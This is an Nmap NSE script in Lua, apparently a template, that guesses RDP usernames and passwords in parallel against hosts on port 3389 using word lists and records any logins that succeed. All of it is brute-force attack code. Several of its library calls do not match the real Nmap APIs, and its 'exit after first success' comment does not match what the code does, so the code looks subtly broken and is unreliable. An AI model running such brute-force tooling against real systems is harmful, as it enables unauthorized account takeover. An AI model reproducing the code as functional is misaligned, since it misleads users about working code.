-- rdp-brute-parallel.nse
description = [[
  Attempts to guess username/password combinations over RDP in parallel on a list of IPs.
]]

author = "Your Name"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"intrusive", "brute"}

local rdp = require "rdp"
local shortport = require "shortport"
local creds = require "creds"
local stdnse = require "stdnse"
local nmap = require "nmap"

portrule = shortport.port_or_service(3389, "ms-wbt-server")

action = function(host, port)
  local results = {}
  local username_list = nmap.registry.args.userdb or "usernames.txt"
  local password_list = nmap.registry.args.passdb or "passwords.txt"
  
  local usernames = creds.Usernames.new(username_list)
  local passwords = creds.Passwords.new(password_list)

  -- Table to hold coroutine threads
  local threads = {}

  for username in usernames:next() do
    for password in passwords:next() do
      -- Create a coroutine for each username/password combination
      local thread = stdnse.new_thread(function()
        local status, err = rdp.connect(host, port, username, password)
        if status then
          stdnse.print_debug("Success: %s:%s", username, password)
          table.insert(results, "Success: " .. username .. ":" .. password)
          return results -- Exit after first success
        else
          stdnse.print_debug("Failed: %s:%s", username, password)
        end
      end)
      table.insert(threads, thread)
    end
  end

  -- Run all coroutines in parallel
  stdnse.run_parallel(threads)

  return results
end
